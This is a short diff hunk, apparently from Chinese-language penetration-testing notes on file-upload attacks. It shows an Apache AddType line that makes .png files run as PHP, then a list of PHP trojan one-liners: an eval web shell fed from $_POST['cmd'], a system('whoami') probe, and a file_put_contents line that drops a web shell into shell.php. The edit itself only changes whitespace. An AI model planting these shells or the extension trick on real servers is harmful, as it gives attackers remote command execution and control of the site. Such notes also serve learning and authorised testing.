@@ -100,9 +100,11 @@ AddType application/x-httpd-php .png
 将.png当作php文件解析
 木马
 <?php phpinfo(); ?>
-<?php @eval($_POST['cmd']);?>
+<?php 
+@eval($_POST['cmd']);
+?>
 <?php system("whoami"); ?>
 <?php
-file_put_contents("shell.php","<?php @eval($_POST['cmd']); ?>"); 
+file_put_contents("shell.php","<?php @eval($_POST['cmd']); ?>");
 ?>
 
